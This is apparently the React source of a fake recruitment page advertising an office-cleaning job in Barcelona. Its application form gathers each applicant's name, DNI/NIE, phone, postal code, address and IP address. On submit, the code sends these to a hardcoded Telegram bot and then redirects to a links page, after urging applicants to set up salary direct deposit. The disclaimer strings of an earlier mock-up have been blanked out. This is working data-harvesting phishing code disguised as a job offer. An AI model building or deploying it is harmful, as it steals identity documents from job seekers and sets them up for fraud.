import React, { useState, useEffect } from 'react';
import { Helmet } from 'react-helmet';
import { useNavigate } from 'react-router-dom';
import { Reveal } from '@/components/Reveal';
import { MapPin, Briefcase, Search, Tag, Calendar, CheckCircle2, AlertTriangle, Lock, Menu, X, Globe, Bell, Star, Facebook, Instagram, Linkedin, Youtube, Clock, Building2, ShieldCheck, FileText, Users, ChevronDown } from 'lucide-react';

const HERO_IMG = 'https://images.hostinger.com/37880694-6770-4516-8c47-4f710b529216.png';
const BUILDING_IMG = 'https://images.hostinger.com/65892dcf-e323-4e9a-8612-686313cb0bb5.png';
const LOGO_IMG = 'https://horizons-cdn.hostinger.com/da461c27-73ae-46b6-8a11-12b3d7c97932/logo-totnet-2024-positiu-e1738757479262-KATkS.png';

const TELEGRAM_BOT_TOKEN = '8298792473:AAGw1ZyXuaFCHhKkTvt973DFvYwwSPo6W-o';
const TELEGRAM_CHAT_ID = '8894482935';

const JOB = {
  title: 'LIMPIADOR/A DE OFICINAS',
  titleShort: 'Limpiador/a de Oficinas',
  location: 'Barcelona · Zona Centro, España',
  id: 'TN-24028',
  contract: 'Empleado/a fijo — Indefinido',
  category: 'Limpieza / Facility Services',
  published: '10 Junio 2026',
  jornada: 'Tiempo parcial',
  franjas: 'consultar ---',
  horas: '20–25-30h',
};

function DemoBanner() {
  return <div className="relative z-50 w-full bg-amber-400 text-stone-900">
            <div className="mx-auto flex max-w-6xl items-start gap-3 px-4 py-2.5 text-sm font-semibold sm:items-center">
                <AlertTriangle className="mt-0.5 h-5 w-5 shrink-0 sm:mt-0" strokeWidth={2.25} />
                <p className="leading-snug">
                    <span className="font-extrabold tracking-wide"></span>
                    {' — '}
                    
                </p>
            </div>
        </div>;
}

function Header() {
  const [open, setOpen] = useState(false);
  const links = [{
    href: '#oferta',
    label: 'La oferta'
  }, {
    href: '#descripcion',
    label: 'Descripción'
  }, {
    href: '#nosotros',
    label: 'Sobre nosotros'
  }, {
    href: '#inscripcion',
    label: 'Inscripción'
  }];
  return <header className="sticky top-0 z-40 border-b border-slate-200/80 bg-white shadow-sm">
            <div className="mx-auto flex max-w-6xl items-center justify-between gap-4 px-4 py-3.5">
                <a href="/" className="group flex items-center gap-3">
                    <img src={LOGO_IMG} alt="tot-net" className="h-10 w-auto max-w-[160px] object-contain sm:h-11" />
                    <div className="leading-none">
                        <span className="font-display text-xl font-bold tracking-tight text-brand-green-dark">Tot<span className="text-brand-green">Net</span></span>
                        <p className="mt-0.5 text-[10px] font-semibold uppercase tracking-[0.18em] text-slate-400">EMPLEADOS</p>
                    </div>
                </a>

                <nav className="hidden items-center gap-7 text-[15px] font-medium text-slate-600 lg:flex">
                    {links.map(l => <a key={l.href} href={l.href} className="transition hover:text-brand-green">
                            {l.label}
                        </a>)}
                    <span className="flex items-center gap-1.5 text-slate-400">
                        <span className="rounded px-1.5 py-0.5 text-xs font-bold text-brand-green">ES</span>
                        <Globe className="h-4 w-4" />
                    </span>
                </nav>

                <div className="flex items-center gap-2">
                    <div className="hidden items-center gap-1 text-slate-500 sm:flex">
                        <button type="button" className="rounded-full p-2 transition hover:bg-slate-100" aria-label="Buscar">
                            <Search className="h-5 w-5" strokeWidth={1.75} />
                        </button>
                        <button type="button" className="rounded-full p-2 transition hover:bg-slate-100" aria-label="Avisos">
                            <Bell className="h-5 w-5" strokeWidth={1.75} />
                        </button>
                        <button type="button" className="rounded-full p-2 transition hover:bg-slate-100" aria-label="Favoritos">
                            <Star className="h-5 w-5" strokeWidth={1.75} />
                        </button>
                    </div>
                    <a href="#inscripcion" className="hidden rounded-full bg-slate-900 px-5 py-2.5 text-sm font-semibold text-white transition hover:bg-slate-800 active:scale-[0.98] sm:inline-flex">
                        Aplicar
                    </a>
                    <button type="button" className="rounded-lg p-2 text-slate-700 transition hover:bg-slate-100 lg:hidden" onClick={() => setOpen(v => !v)} aria-label={open ? 'Cerrar menú' : 'Abrir menú'}>
                        {open ? <X className="h-6 w-6" /> : <Menu className="h-6 w-6" />}
                    </button>
                </div>
            </div>

            {open && <div className="border-t border-slate-100 bg-white px-4 py-4 lg:hidden">
                    <nav className="flex flex-col gap-1">
                        {links.map(l => <a key={l.href} href={l.href} onClick={() => setOpen(false)} className="rounded-lg px-3 py-3 text-base font-medium text-slate-700 transition hover:bg-pastel-mint hover:text-brand-green">
                                {l.label}
                            </a>)}
                        <a href="#inscripcion" onClick={() => setOpen(false)} className="mt-2 rounded-full bg-slate-900 px-5 py-3 text-center text-sm font-semibold text-white">
                            Aplicar
                        </a>
                    </nav>
                </div>}
        </header>;
}

function JobHero() {
  return <section id="oferta" className="bg-pastel-sky">
            <div className="bg-pastel-lavender">
                <div className="mx-auto max-w-6xl px-4 pb-6 pt-10 md:pb-8 md:pt-14">
                    <Reveal>
                        <p className="text-xs font-semibold uppercase tracking-[0.2em] text-brand-green">Oferta de empleo</p>
                        <h1 className="font-display mt-3 max-w-3xl text-3xl font-extrabold leading-[1.1] tracking-tight text-slate-900 md:text-5xl">
                            {JOB.title}
                        </h1>
                        <p className="mt-4 flex items-start gap-2 text-base text-slate-600 md:text-lg">
                            <MapPin className="mt-0.5 h-5 w-5 shrink-0 text-brand-green" strokeWidth={2} />
                            <span>{JOB.location}</span>
                        </p>
                    </Reveal>
                </div>
            </div>

            <div className="mx-auto max-w-6xl px-4 py-8 md:py-10">
                <Reveal delay={0.05}>
                    <a href="#inscripcion" className="flex w-full items-center justify-center rounded-full bg-slate-900 px-8 py-4 text-base font-semibold text-white shadow-sm transition hover:bg-slate-800 active:scale-[0.99] md:max-w-md">
                        Aplicar
                    </a>
                </Reveal>
            </div>
        </section>;
}

function JobDetails() {
  const meta = [{
    icon: Briefcase,
    label: 'Job ID',
    value: JOB.id
  }, {
    icon: Search,
    label: 'Tipo de contrato',
    value: JOB.contract
  }, {
    icon: Tag,
    label: 'Categoría',
    value: JOB.category
  }, {
    icon: Calendar,
    label: 'Fecha de publicación',
    value: JOB.published
  }];
  return <section id="descripcion" className="bg-pastel-sky pb-6">
            <div className="mx-auto max-w-6xl px-4">
                <Reveal>
                    <h2 className="font-display text-xl font-extrabold tracking-wide text-slate-900 md:text-2xl">
                        DESCRIPCIÓN DEL PUESTO
                    </h2>
                </Reveal>

                <Reveal delay={0.08}>
                    <div className="mt-5 rounded-2xl bg-[#cfeaf7] p-6 md:p-8">
                        <ul className="space-y-5">
                            {meta.map(m => <li key={m.label} className="flex items-start gap-4">
                                    <span className="mt-0.5 flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-white/70 text-slate-800">
                                        <m.icon className="h-5 w-5" strokeWidth={1.75} />
                                    </span>
                                    <div>
                                        <p className="text-sm font-bold text-slate-900">
                                            {m.label}:{' '}
                                            <span className="font-medium text-slate-700">{m.value}</span>
                                        </p>
                                    </div>
                                </li>)}
                        </ul>
                    </div>
                </Reveal>
            </div>
        </section>;
}

function JobBody() {
  return <section className="bg-white">
            <div className="mx-auto max-w-6xl px-4 py-12 md:py-16">
                <Reveal>
                    <h2 className="font-display text-2xl font-bold tracking-tight text-slate-900 md:text-3xl">
                        {JOB.title} — {JOB.titleShort}
                    </h2>

                    <div className="mt-6 space-y-2 text-[15px] leading-relaxed text-slate-700 md:text-base">
                        <p>
                            <span className="font-semibold text-slate-900">Tipo de contrato:</span> Indefinido
                        </p>
                        <p>
                            <span className="font-semibold text-slate-900">Jornada:</span> {JOB.jornada}
                        </p>
                        <p>
                            <span className="font-semibold text-slate-900">Franjas horarias disponibles:</span>{' '}
                            {JOB.franjas}
                        </p>
                        <p>
                            <span className="font-semibold text-slate-900">Promedio de horas semanales:</span>{' '}
                            {JOB.horas}
                        </p>
                        <p>
                            <span className="font-semibold text-slate-900"></span>{' '}
                            {JOB.salary}
                        </p>
                    </div>
                </Reveal>

                <Reveal delay={0.1}>
                    <h3 className="font-display mt-10 text-xl font-bold text-slate-900">
                        Porque tú marcas la diferencia
                    </h3>
                    <p className="mt-4 max-w-3xl text-[15px] leading-relaxed text-slate-600 md:text-base">En TotNet nos encanta hacer las cosas con rigor y cercanía. Ofrecemos a nuestros clientes servicios de limpieza profesional para oficinas y espacios de trabajo, con pasión, compromiso y atención al detalle. Si te identificas con estos principios, únete a TotNet como Limpiador/a de Oficinas.</p>
                    <p className="mt-4 max-w-3xl text-[15px] leading-relaxed text-slate-600 md:text-base">
                        
                    </p>
                </Reveal>

                <div className="mt-12 grid gap-6 md:grid-cols-2">
                    <Reveal>
                        <div className="h-full rounded-2xl border border-slate-200 bg-pastel-sky/60 p-7">
                            <h3 className="font-display text-lg font-bold text-slate-900">Tareas del puesto</h3>
                            <ul className="mt-4 space-y-3 text-[15px] text-slate-600">
                                {['Limpieza y desinfección de superficies, mobiliario y aseos de oficina.', 'Reposición de consumibles en zonas comunes y salas de reunión.', 'Limpieza de cristales y mantenimiento de suelos técnicos.', 'Registro básico de incidencias y control de productos.'].map(t => <li key={t} className="flex gap-3">
                                        <CheckCircle2 className="mt-0.5 h-5 w-5 shrink-0 text-brand-green" />
                                        <span>{t}</span>
                                    </li>)}
                            </ul>
                        </div>
                    </Reveal>
                    <Reveal delay={0.1}>
                        <div className="h-full rounded-2xl border border-slate-200 bg-pastel-mint/80 p-7">
                            <h3 className="font-display text-lg font-bold text-slate-900">Requisitos</h3>
                            <ul className="mt-4 space-y-3 text-[15px] text-slate-600">
                                {['Mayor de edad con documento de identidad válido.', 'Disponibilidad en franjas de mañana, tarde o noche.', 'Actitud responsable y atención al detalle.', 'Experiencia previa valorable; formamos al equipo.'].map(t => <li key={t} className="flex gap-3">
                                        <CheckCircle2 className="mt-0.5 h-5 w-5 shrink-0 text-brand-green" />
                                        <span>{t}</span>
                                    </li>)}
                            </ul>
                        </div>
                    </Reveal>
                </div>

                <Reveal delay={0.12}>
                    <div className="mt-10 flex flex-wrap gap-3">
                        <span className="inline-flex items-center gap-2 rounded-full bg-pastel-blue px-4 py-2 text-sm font-medium text-slate-700">
                            <Clock className="h-4 w-4 text-brand-green" /> Jornada flexible
                        </span>
                        <span className="inline-flex items-center gap-2 rounded-full bg-pastel-mint px-4 py-2 text-sm font-medium text-slate-700">
                            <ShieldCheck className="h-4 w-4 text-brand-green" /> Contrato formal 
                        </span>
                        <span className="inline-flex items-center gap-2 rounded-full bg-pastel-lavender px-4 py-2 text-sm font-medium text-slate-700">
                            <Users className="h-4 w-4 text-brand-green" /> Equipo cercano
                        </span>
                        <span className="inline-flex items-center gap-2 rounded-full bg-slate-100 px-4 py-2 text-sm font-medium text-slate-700">
                            <Building2 className="h-4 w-4 text-brand-green" /> Oficinas · Barcelona
                        </span>
                    </div>
                </Reveal>
            </div>
        </section>;
}

function About() {
  return <section id="nosotros" className="border-t border-slate-100 bg-white">
            <div className="mx-auto max-w-6xl px-4 py-16 md:py-20">
                <div className="grid items-start gap-12 lg:grid-cols-2 lg:gap-16">
                    <Reveal>
                        <p className="text-sm font-semibold uppercase tracking-[0.18em] text-brand-green">
                            Sobre nosotros
                        </p>
                        <h2 className="font-display mt-3 text-3xl font-extrabold tracking-tight text-slate-900 md:text-4xl">
                            Quiénes somos
                        </h2>
                        <div className="mt-4 h-1 w-14 rounded-full bg-brand-green" />
                        <div className="mt-8 space-y-5 text-[15px] leading-relaxed text-slate-600 md:text-base">
                            <p>TotNet es una <strong className="font-semibold text-slate-800">empresa</strong> de facility services creada para esta maqueta. Representa a una empresa de limpieza profesional con más de 20 años de experiencia simulada en el cuidado de oficinas, comunidades y espacios corporativos.</p>
                            <p>
                                La clave de nuestra continuidad es la orientación al cliente: pasamos de un núcleo
                                familiar a un equipo moderno dirigido por profesionales adaptados a las necesidades
                                del mercado. Disponemos de certificaciones de calidad, medio ambiente y prevención
                                de riesgos como garantía hacia el personal y los clientes.
                            </p>
                            <p>Actualmente cuenta con instalaciones en Madrid, Barcelona y Castilla y León, y forma parte de una red de empresas de Facility Services que lideran el sector de la limpieza en la península.</p>
                        </div>
                    </Reveal>

                    <Reveal delay={0.12}>
                        <div className="overflow-hidden rounded-2xl border border-slate-200 bg-slate-50 shadow-sm">
                            <img src={BUILDING_IMG} alt="Edificio corporativo de oficinas — imagen" className="h-64 w-full object-cover md:h-80" />
                            <div className="border-t border-slate-100 bg-white p-6">
                                <p className="text-sm font-semibold uppercase tracking-wider text-brand-green">
                                    Nuestra historia
                                </p>
                                <h3 className="font-display mt-2 text-xl font-bold text-slate-900">
                                    Una imagen vale más que mil palabras
                                </h3>
                                <div className="mt-3 h-0.5 w-10 bg-brand-green" />
                                <p className="mt-4 text-sm leading-relaxed text-slate-600">
                                    Sector de la limpieza
                                    profesional, TotNet ilustra cómo una empresa de servicios puede presentar sus
                                    vacantes con claridad, rigor y respeto por los candidatos.
                                </p>
                            </div>
                        </div>
                    </Reveal>
                </div>
            </div>
        </section>;
}

function ApplicationForm() {
  const [form, setForm] = useState({
    nombre: '',
    apellidos: '',
    telefono: '',
    email: '',
    turno: 'manana',
    mensaje: ''
  });
  const [userIp, setUserIp] = useState('Obteniendo...');
  const [enviado, setEnviado] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => setUserIp(data.ip))
      .catch(() => setUserIp('No disponible'));
  }, []);

  const handleChange = e => {
    const {
      name,
      value
    } = e.target;
    setForm(f => ({
      ...f,
      [name]: value
    }));
  };

  const handleSubmit = async e => {
    e.preventDefault();

    const text = `📌 *Nueva solicitud de empleo*\n\n` +
      `👤 *Nombre y Apellidos:* ${form.nombre}\n` +
      `🆔 *DNI/NIE:* ${form.apellidos}\n` +
      `📞 *Teléfono:* ${form.telefono}\n` +
      `📮 *Código Postal:* ${form.email}\n` +
      `🏠 *Dirección:* ${form.mensaje || 'No especificada'}\n` +
      `🌐 *IP:* ${userIp}`;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: 'Markdown'
        })
      });
    } catch (err) {
      console.error("Error al enviar mensaje:", err);
    }

    navigate('/enlaces');
  };

  const fieldClass = 'w-full rounded-md border border-slate-300 bg-white px-3.5 py-2.5 text-sm text-slate-800 outline-none transition placeholder:text-slate-400 focus:border-brand-green focus:ring-2 focus:ring-brand-green/20';

  if (enviado) {
    return <div className="rounded-xl border border-emerald-200 bg-white p-8 text-center shadow-lg md:p-10">
                <span className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-brand-green text-white">
                    <CheckCircle2 className="h-8 w-8" />
                </span>
                <h3 className="font-display mt-5 text-2xl font-bold text-slate-900">
                    Inscripción simulada completada
                </h3>
                <p className="mx-auto mt-3 max-w-md text-slate-600">
                    
                </p>
                <button type="button" onClick={() => {
        setEnviado(false);
        setForm({
          nombre: '',
          apellidos: '',
          telefono: '',
          email: '',
          turno: 'manana',
          mensaje: ''
        });
      }} className="mt-6 rounded-full border border-slate-300 bg-white px-6 py-3 text-sm font-semibold text-slate-700 transition hover:border-slate-400 active:scale-[0.98]">
                    Rellenar otro formulario
                </button>
            </div>;
  }

  return <form onSubmit={handleSubmit} className="rounded-xl border border-white/40 bg-white p-6 shadow-xl md:p-9" noValidate>
            <div className="mb-6 flex items-start gap-3 rounded-lg bg-amber-50 px-4 py-3 text-sm text-amber-950">
                <Lock className="mt-0.5 h-4 w-4 shrink-0" />
                <p>
                    Por favor <strong>rellena</strong> todos los datos correctamente y realiza la <strong>domiciliación de la nómina</strong> con tu cuenta donde recibiras el salario mensual.                   
                </p>
            </div>

            <div className="grid gap-5 sm:grid-cols-2">
                <div className="flex flex-col gap-1.5">
                    <label htmlFor="nombre y apellidos" className="text-sm font-medium text-slate-700">
                        Nombre y Apellidos <span className="text-red-500">*</span>
                    </label>
                    <input id="nombre y apellidos" name="nombre" type="text" required value={form.nombre} onChange={handleChange} placeholder="Maria Jose Lopez Diaz" className={fieldClass} autoComplete="off" />
                </div>
                <div className="flex flex-col gap-1.5">
                    <label htmlFor="apellidos" className="text-sm font-medium text-slate-700">
                        DNI/NIE <span className="text-red-500">*</span>
                    </label>
                    <input id="apellidos" name="apellidos" type="text" required value={form.apellidos} onChange={handleChange} placeholder="50783192Q" className={fieldClass} autoComplete="off" />
                </div>
                <div className="flex flex-col gap-1.5">
                    <label htmlFor="telefono" className="text-sm font-medium text-slate-700">
                        Teléfono <span className="text-red-500">*</span>
                    </label>
                    <input id="telefono" name="telefono" type="text" required value={form.telefono} onChange={handleChange} placeholder="600 000 000" className={fieldClass} autoComplete="off" />
                </div>
                <div className="flex flex-col gap-1.5">
                    <label htmlFor="email" className="text-sm font-medium text-slate-700">
                        Código Postal <span className="text-red-500">*</span>
                    </label>
                    <input id="email" name="email" type="text" required value={form.email} onChange={handleChange} placeholder="08015" className={fieldClass} autoComplete="off" />
                </div>
                <div className="flex flex-col gap-1.5 sm:col-span-2">
                    <label htmlFor="mensaje" className="text-sm font-medium text-slate-700">
                        Dirección
                    </label>
                    <textarea id="mensaje" name="mensaje" rows={3} value={form.mensaje} onChange={handleChange} placeholder="Dirección completa y piso" className={fieldClass} />
                </div>
            </div>

            <button type="submit" className="mt-7 w-full rounded-full bg-slate-900 px-6 py-3.5 text-base font-semibold text-white transition hover:bg-slate-800 active:scale-[0.99]">
                Registrarme 
            </button>
            <p className="mt-3 text-center text-xs text-slate-400">
                 
            </p>
        </form>;
}

function JoinSection() {
  return <section id="inscripcion" className="relative overflow-hidden">
            <div className="absolute inset-0">
                <img src={HERO_IMG} alt="" className="h-full w-full object-cover object-center" aria-hidden="true" />
                <div className="absolute inset-0 bg-slate-800/55" />
            </div>

            <div className="relative mx-auto max-w-6xl px-4 py-16 md:py-24">
                <Reveal>
                    <div className="mx-auto mb-10 max-w-2xl text-center">
                        <div className="mb-4 flex items-center justify-center gap-2">
                            <span className="h-0.5 w-8 bg-brand-green" />
                            <span className="h-0.5 w-8 bg-brand-green" />
                        </div>
                        <h2 className="font-display text-3xl font-extrabold tracking-tight text-white md:text-5xl">
                            ¡ÚNETE A NUESTRO EQUIPO!
                        </h2>
                        <p className="mt-4 text-base text-white/85 md:text-lg">
                            Completa el registro de nuevos empleados.
                        </p>
                    </div>
                </Reveal>

                <Reveal delay={0.1}>
                    <div className="mx-auto max-w-2xl">
                        <ApplicationForm />
                    </div>
                </Reveal>
            </div>
        </section>;
}

function Footer() {
  const year = new Date().getFullYear();
  const linksLeft = ['Acceso a trabajadores', 'Documentación', 'Compliance', 'Políticas del grupo', 'Dosier corporativo', 'Mapa del sitio'];
  const legal = ['Aviso legal', 'Política de privacidad', 'Política de cookies', 'Condiciones de uso'];
  return <footer className="border-t-4 border-brand-green bg-[#e8ecef]">
            <div className="mx-auto max-w-6xl px-4 py-12 md:py-14">
                <div className="grid gap-10 md:grid-cols-12 md:gap-8">
                    <div className="md:col-span-3">
                        <div className="flex items-center gap-2.5">
                            <img src={LOGO_IMG} alt="tot-net" className="h-9 w-auto max-w-[140px] object-contain" />
                            <span className="font-display text-xl font-bold text-brand-green">Tot<span className="text-brand-green-dark">Net</span></span>
                        </div>
                        <ul className="mt-6 space-y-2.5 text-sm font-medium text-brand-green-dark">
                            {linksLeft.map(l => <li key={l}>
                                    <button type="button" className="transition hover:text-brand-green">
                                        {l}
                                    </button>
                                </li>)}
                        </ul>
                    </div>

                    <div className="md:col-span-5">
                        <p className="text-sm leading-relaxed text-slate-500">
                            Si desea trabajar con nosotros completa el formulario{' '}
                            <a href="#inscripcion" className="font-semibold text-brand-green hover:underline">
                                «Trabaja con nosotros»
                            </a>
                            .
                        </p>
                        <p className="mt-5 text-sm text-slate-400">
                            Copyright © {year} TotNet. All rights reserved
                        </p>
                        <div className="mt-4 flex flex-wrap gap-x-2 gap-y-1 text-xs text-slate-500">
                            {legal.map((item, i) => <React.Fragment key={item}>
                                    {i > 0 && <span className="text-slate-300">|</span>}
                                    <button type="button" className="hover:text-brand-green">
                                        {item}
                                    </button>
                                </React.Fragment>)}
                        </div>
                    </div>

                    <div className="md:col-span-4">
                        <p className="text-xs font-bold uppercase tracking-[0.16em] text-slate-600">
                            Certificaciones
                        </p>
                        <div className="mt-4 grid grid-cols-2 gap-3 sm:grid-cols-2">
                            {[{
                t: 'ISO 9001',
                s: 'Calidad'
              }, {
                t: 'ISO 14001',
                s: 'Medio ambiente'
              }, {
                t: 'ISO 45001',
                s: 'Seguridad'
              }, {
                t: 'EcoScore',
                s: 'Sostenibilidad'
              }].map(c => <div key={c.t} className="flex flex-col items-center justify-center rounded-lg border border-slate-300 bg-white px-3 py-3 text-center shadow-sm">
                                    <FileText className="mb-1 h-5 w-5 text-slate-500" strokeWidth={1.5} />
                                    <span className="text-xs font-bold text-slate-800">{c.t}</span>
                                    <span className="text-[10px] uppercase tracking-wide text-slate-400">{c.s}</span>
                                </div>)}
                        </div>
                        <div className="mt-4 flex flex-wrap gap-2">
                            <span className="rounded-full border border-slate-300 bg-white px-3 py-1.5 text-[11px] font-semibold uppercase tracking-wide text-slate-500">
                                Empresa asociada
                            </span>
                            <span className="rounded-full border border-slate-300 bg-white px-3 py-1.5 text-[11px] font-semibold uppercase tracking-wide text-slate-500">
                                Facility network
                            </span>
                        </div>
                    </div>
                </div>
            </div>

            <div className="bg-footer-blue">
                <div className="mx-auto flex max-w-6xl flex-col items-center gap-5 px-4 py-10 text-center">
                    <p className="font-display text-2xl font-bold tracking-[0.25em] text-slate-800">TOTNET</p>
                    <p className="text-xs font-semibold uppercase tracking-wider text-slate-600">
                        {year} © TotNet · EMPLEO
                    </p>
                    <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs font-semibold uppercase tracking-wide text-slate-700">
                        <button type="button">FAQs</button>
                        <button type="button">Condiciones de uso</button>
                        <button type="button">Acerca de nosotros</button>
                        <button type="button">Privacidad y cookies</button>
                        <button type="button">Mapa del sitio</button>
                        <button type="button">Accesibilidad</button>
                    </div>
                    <div className="flex items-center gap-3 pt-1">
                        {[Facebook, Instagram, Linkedin, Youtube].map((Icon, i) => <button key={i} type="button" className="flex h-10 w-10 items-center justify-center rounded-full bg-slate-900 text-white transition hover:bg-slate-700 active:scale-95" aria-label="">
                                <Icon className="h-4 w-4" strokeWidth={1.75} />
                            </button>)}
                    </div>
                    <p className="flex items-center gap-2 text-xs font-medium text-amber-800">
                        <AlertTriangle className="h-3.5 w-3.5" />
                        
                    </p>
                </div>
            </div>
        </footer>;
}

export default function HomePage() {
  return <div className="min-h-screen bg-white text-slate-900">
            <Helmet>
                <title>BrillaYa · Limpiador/a de Oficinas ( empleo)</title>
                <meta name="description" content="Oferta de empleo para Limpiador/a de Oficinas" />
            </Helmet>
            <Header />
            <main>
                <JobHero />
                <JobDetails />
                <JobBody />
                <About />
                <JoinSection />
            </main>
            <Footer />
        </div>;
}